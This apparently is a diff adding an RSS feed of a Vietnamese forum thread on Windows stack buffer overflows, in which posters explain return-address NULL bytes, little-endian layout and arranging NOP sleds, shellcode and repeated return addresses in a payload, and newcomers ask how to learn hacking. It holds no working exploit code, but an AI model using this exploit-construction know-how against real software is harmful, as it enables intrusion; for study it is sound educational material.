+Địa chỉ là 4byte. Do cái $return_address của Semoun trong trường hợp này là 0x12ff68 chỉ có 3 byte (qui ước ngầm viết tắt của 0x0012ff68) chứ nếu địa chỉ là 0x12ff6800 thì nhất định NULL byte phải hiển thị tường minh chứ ko đựoc viết tắt theo kiểu 0x12ff68 :D. Mà nếu cái $ret_address mà là 0x12ff6800 thì khi viết lại trong PAYLOAD là
+NOP...NOP.....SHELLCODE....NOP...NOP...\x00\x12\xff\xbf thì khi strcpy sẽ thất bại :D.
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#159011</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#159011</link>
+				<pubDate><![CDATA[Sat, 15 Nov 2008 11:58:22]]> GMT</pubDate>
+				<author><![CDATA[ megatron]]></author>
+			</item>
+			<item>
+				<title>Re: Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Thường thì người ta không pad sau shellcode bằng NOPs, mà pad trực tiếp bằng ret_addr, lặp đi lặp lại nhiều lần. Trong trường hợp này, vì ret_addr có chứa NULL, nên không thể làm vậy được, cho nên NOPs chỉ là 1 ví dụ, trên thực tế có thể thay bằng bất cứ cái gì khác NULL.
+
+Trong ví dụ của <b>seamoun</b>, đúng là kí tự NULL cuối cùng không cần thiết, vì strcpy sau khi ghi hết byte cuối cùng, sẽ tự động ghi đè lên vị trí tiếp theo giá trị NULL, và như vậy làm cho vị trí return address trở thành \x68\xff\x12\x00, và vì Windows NT sử dụng little-endianess, nên return address sẽ là 0x0012ff68, đúng như attacker dự đoán.
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#159068</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#159068</link>
+				<pubDate><![CDATA[Sat, 15 Nov 2008 21:55:15]]> GMT</pubDate>
+				<author><![CDATA[ StarGhost]]></author>
+			</item>
+			<item>
+				<title>Re: Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ StarGhost,
+
+Ờ há, little endian thì sau khi bỏ cái null byte ở cuối thì địa chỉ vẫn phải là 0x0012ff68 mới đúng chứ. Không hiểu sao hôm đó khoai lại nghĩ ra là 0x12ff6800 nữa.
+
+megatron,
+
+Mình lấy lại hình 5 của anh seamoun làm ví dụ. Thông thường, ngay trước khi strcpy, ESP sẽ point ngay tại vulnerbale buf<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>+------------------ESP
+|
+V
++------------------------------------+-----+-----+
+|    Vulnerable buffer               | EBP | RET |
++------------------------------------+-----+-----+</pre>
+		</div>
+Còn sau khi strcpy thì sơ đồ memory có dạng sau:<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>+-----------------+------------------+-----+-----+
+| NOPs            |  Shellcode       | nRET|nRET |
++-----------------+------------------+-----+-----+
+                                  ^
+                                  |
+                   ESP -----------+
+                                  |
+                                  V
++-------+--------------------+-------+-----+-----+
+| NOPs  |     Shellcode      | pads  | nRET|nRET |
++-------+--------------------+-------+-----+-----+</pre>
+		</div>
+So sánh hai cái input trên (1) và dưới (2). Nếu shellcode trong (1) có sử dụng đến stack và push vài giá trị lên stack thì chính bản thân shellcode sẽ bị overwrite.
+
+Do đó, thông thường người ta pads phía sau shellcode và cắt bớt phần NOPs phía đầu. Như StarGhost có đề cập, thường thì địa chỉ mới nRET được fill đầy buffer, sau đó fill NOP rồi đến shellcode. Phần dư ra (đoạn pads) sẽ là phần nRET còn dư không dùng. Đoạn này thường không được dùng đến. Do đó, để gì ở đây cũng được.
+
+kkhoai
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#159119</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#159119</link>
+				<pubDate><![CDATA[Sun, 16 Nov 2008 13:48:30]]> GMT</pubDate>
+				<author><![CDATA[ Mr.Khoai]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Các anh ơi
+em mới down cái giáo trình Hacker có 7 CD ý.
+Học cái đó thì liệu có trở thành Hacker ko hả các anh
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202906</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202906</link>
+				<pubDate><![CDATA[Sun, 10 Jan 2010 02:29:32]]> GMT</pubDate>
+				<author><![CDATA[ Mr_Kinara]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Ai có thể login vào active mấy cái hình không. Không xem được hình kìa :(]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202909</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202909</link>
+				<pubDate><![CDATA[Sun, 10 Jan 2010 03:24:31]]> GMT</pubDate>
+				<author><![CDATA[ hmtaccess]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Update mấy cái ảnh mới cho mọi người :)
+<br>
+			<div align="center" class="limitview"><img src='http://up.anhso.net/upload/20100111/00/o/anhso-31_h1-1.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+<br>
+			<div align="center" class="limitview"><img src='http://up.anhso.net/upload/20100111/00/o/anhso-35_h2.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+<br>
+			<div align="center" class="limitview"><img src='http://up.anhso.net/upload/20100111/00/o/anhso-36_h3.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+<br>
+			<div align="center" class="limitview"><img src='http://up.anhso.net/upload/20100111/00/o/anhso-39_h4.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+<br>
+			<div align="center" class="limitview"><img src='http://up.anhso.net/upload/20100111/00/o/anhso-41_h5.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+<br>
+			<div align="center" class="limitview"><img src='http://up.anhso.net/upload/20100111/00/o/anhso-43_h6.jpg' border="0" onload="maxImg(this, 500px);" /></div>
+Cảm phiền mod nào edit bài của anh seamoun.
+Link anhso.net chắc là live forever ko bị giới hạn BW các kiểu :D
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202924</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202924</link>
+				<pubDate><![CDATA[Sun, 10 Jan 2010 08:21:26]]> GMT</pubDate>
+				<author><![CDATA[ phanledaivuong]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mr_Kinara wrote:</cite><br>
+		<blockquote>Các anh ơi
+em mới down cái giáo trình Hacker có 7 CD ý.
+Học cái đó thì liệu có trở thành Hacker ko hả các anh
+&nbsp;
+		</blockquote>
+sao chả có ai trả lời câu hỏi của em vậy
+hjx hjx]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202958</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202958</link>
+				<pubDate><![CDATA[Sun, 10 Jan 2010 22:19:27]]> GMT</pubDate>
+				<author><![CDATA[ Mr_Kinara]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Em có chuyển sang PDF.Neúi cần thì download :
+ http://www.mediafire.com/?gzknmzzyzjj]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202974</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202974</link>
+				<pubDate><![CDATA[Mon, 11 Jan 2010 06:53:44]]> GMT</pubDate>
+				<author><![CDATA[ be_ni_na]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Mr_Kinara wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">Mr_Kinara wrote:</cite><br>
+		<blockquote>Các anh ơi
+em mới down cái giáo trình Hacker có 7 CD ý.
+Học cái đó thì liệu có trở thành Hacker ko hả các anh
+&nbsp;
+		</blockquote>
+sao chả có ai trả lời câu hỏi của em vậy
+hjx hjx&nbsp;
+		</blockquote>
+
+Ko :)                                                                                                                     ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202988</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#202988</link>
+				<pubDate><![CDATA[Mon, 11 Jan 2010 10:39:06]]> GMT</pubDate>
+				<author><![CDATA[ phanledaivuong]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">phanledaivuong wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">Mr_Kinara wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">Mr_Kinara wrote:</cite><br>
+		<blockquote>Các anh ơi
+em mới down cái giáo trình Hacker có 7 CD ý.
+Học cái đó thì liệu có trở thành Hacker ko hả các anh
+&nbsp;
+		</blockquote>
+sao chả có ai trả lời câu hỏi của em vậy
+hjx hjx&nbsp;
+		</blockquote>
+
+Ko :)                                                                                                                     &nbsp;
+		</blockquote>
+
+Anh à, hiện h em đang học ở trường NIIT, em rất thích làm Hacker.
+Cái clip đó công nhận khó hiểu thật, nó chỉ hướng dẫn qua loa thôi, xem chả biết nó đang hack cái gì.
+Em đang học ở trên HN, có anh Hacker pro nào trong đây ko, truyền thụ cho em 1 ít với, em rất biết ơn  :D
+Liên hệ với em qua yh này nhé : hiep_zicacdo2.
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#203013</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#203013</link>
+				<pubDate><![CDATA[Tue, 12 Jan 2010 01:58:29]]> GMT</pubDate>
+				<author><![CDATA[ Mr_Kinara]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Cho hỏi phải dùng trình biên dịch nào biên dịch code C để OllyDbg có thể revert được. Do em dùng Borland C thì ollyDbg báo không đọc được.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#209037</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#209037</link>
+				<pubDate><![CDATA[Wed, 14 Apr 2010 21:24:21]]> GMT</pubDate>
+				<author><![CDATA[ hezman87]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ không biết có server nào có lỗi  để học không ?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#218856</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#218856</link>
+				<pubDate><![CDATA[Sun, 22 Aug 2010 01:45:04]]> GMT</pubDate>
+				<author><![CDATA[ panfider]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Mình ko hiểu làm như thế nào để chạy perl trên Win để check Stack Buffer overflow?
+Có thể hướng dẫn phần đó đc không nhỉ??
+
+<p></p>
+		<cite class="blockquote">hezman87 wrote:</cite><br>
+		<blockquote>Cho hỏi phải dùng trình biên dịch nào biên dịch code C để OllyDbg có thể revert được. Do em dùng Borland C thì ollyDbg báo không đọc được.&nbsp;
+		</blockquote>
+Thử dùng C-free PRo đi bạn.
+<p></p>
+		<cite class="blockquote">panfider wrote:</cite><br>
+		<blockquote>không biết có server nào có lỗi để học không ?&nbsp;
+		</blockquote>
+Cái này mình thử trên máy ở nhà cũng đc chứ làm gì cần server :-s.có phải remote đâu.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#230452</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#230452</link>
+				<pubDate><![CDATA[Thu, 27 Jan 2011 08:46:07]]> GMT</pubDate>
+				<author><![CDATA[ RECON]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Vâng, cho em hỏi là có phải quá trình cơ bản của việc thực hiện hack là phải hiểu rõ quá trình hoạt động của nó rồi mới hiểu đến các ngôn ngữ lập trình của nó và tìm những lổ hổng không ạ?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#230468</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#230468</link>
+				<pubDate><![CDATA[Thu, 27 Jan 2011 19:46:41]]> GMT</pubDate>
+				<author><![CDATA[ DanhNam]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">DanhNam wrote:</cite><br>
+		<blockquote>Vâng, cho em hỏi là có phải quá trình cơ bản của việc thực hiện hack là phải hiểu rõ quá trình hoạt động của nó rồi mới hiểu đến các ngôn ngữ lập trình của nó và tìm những lổ hổng không ạ?&nbsp;
+		</blockquote>
+
+Trước tiên là phải tìm lỗi trước.....rồi tìm hiểu quá trình hoạt động của nó...sau đó..kiểm tra xem vị trí trả về là ở đâu...xong tính ra.....kiểm tra đc bao nhiêu để mà làm shellcode......]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#230977</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#230977</link>
+				<pubDate><![CDATA[Fri, 11 Feb 2011 01:43:16]]> GMT</pubDate>
+				<author><![CDATA[ RECON]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Mình đang xài thằng WinDBG nhưng mà ko hiểu sao,lúc mình gõ lệnh "g" để nó bắt đầu debug thì nó chạy cũng xong rồi mà nó chứ hiện chữ *BUSY* không cho mình gõ lệnh típ....giờ làm sao hả mấy bạn???
+Giúp mình cái.....]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#231015</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#231015</link>
+				<pubDate><![CDATA[Sat, 12 Feb 2011 06:10:16]]> GMT</pubDate>
+				<author><![CDATA[ RECON]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Cho mình hỏi là mục đích của việc khai thác tràng bộ nhớ đệm là gửi dãy shell code đến chương trình bị lỗi thông qua biến "<font color='orange'>argc</font>" phải không? Từ đó ta có thể thay thế các dòng lệnh của chương trình bị lỗi bằng dòng lệnh của ta.
+Nếu mình nghĩ như vậy đúng hay là sai?
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#260933</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#260933</link>
+				<pubDate><![CDATA[Fri, 6 Apr 2012 05:11:51]]> GMT</pubDate>
+				<author><![CDATA[ zeropoint]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Cảm ơn các anh về bài viết này !. Đọc bài viết cảm giác thật hào hứng :D. Ai có thể cho em hỏi thêm về quá trình map 1 file ecxecuable vào bộ nhớ được không. Hoặc chỉ tài liệu cũng được.
+
+<p></p>
+		<cite class="blockquote">zeropoint wrote:</cite><br>
+		<blockquote>Cho mình hỏi là mục đích của việc khai thác tràng bộ nhớ đệm là gửi dãy shell code đến chương trình bị lỗi thông qua biến "<font color='orange'>argc</font>" phải không? Từ đó ta có thể thay thế các dòng lệnh của chương trình bị lỗi bằng dòng lệnh của ta.
+Nếu mình nghĩ như vậy đúng hay là sai?
+&nbsp;
+		</blockquote>
+
+Không phải là một sự thay thế đâu ! ở đây là ghi đè địa chỉ của một đoạn chương trình ta viết vào stack, chuyển hướng lời gọi tới chương trình của ta. Việc khai thác không chỉ dừng lại ở chèn shellcode vào các arguments. Mà bất kì dữ liệu đầu vào nào, như tập tin, các packet v..v....
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#262617</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#262617</link>
+				<pubDate><![CDATA[Sun, 6 May 2012 20:35:15]]> GMT</pubDate>
+				<author><![CDATA[ chiro8x]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Buffer overflow thường được dùng để chỉ chung những dạng overflow khi xử lý buffer. Nếu đọc kĩ bài trên thì mọi người cũng lại phân biệt được tiếp thế nào là: Heap Overflow và Stack overflow.
+
+:)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#262618</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#262618</link>
+				<pubDate><![CDATA[Sun, 6 May 2012 20:49:31]]> GMT</pubDate>
+				<author><![CDATA[ .lht.]]></author>
+			</item>
+			<item>
+				<title>Tìm hiểu lỗi Buffer Overflow trên Windows</title>
+				<description><![CDATA[ Hiện tại mình đang quan tâm đến lỗi BO(Buffer Overflow) đối với các chương trình thường trực lắng nghe tín hiệu từ bên ngoài gửi đến (chương trình này đã có lỗi BO), mình đang đau đầu làm sao ta có thể gửi một gói tin mà ta có thể làm cho chương trình đó bị BO và thực hiện lện trong cái gỏi tin mình gửi đến (nói chung là định dạng gói tin)? Tương tự như chương trình Ping của Cmd? :( ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/26195.hva#262653</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/26195.hva#262653</link>
+				<pubDate><![CDATA[Mon, 7 May 2012 04:40:24]]> GMT</pubDate>
+				<author><![CDATA[ zeropoint]]></author>
+			</item>
+	</channel>
+</rss>
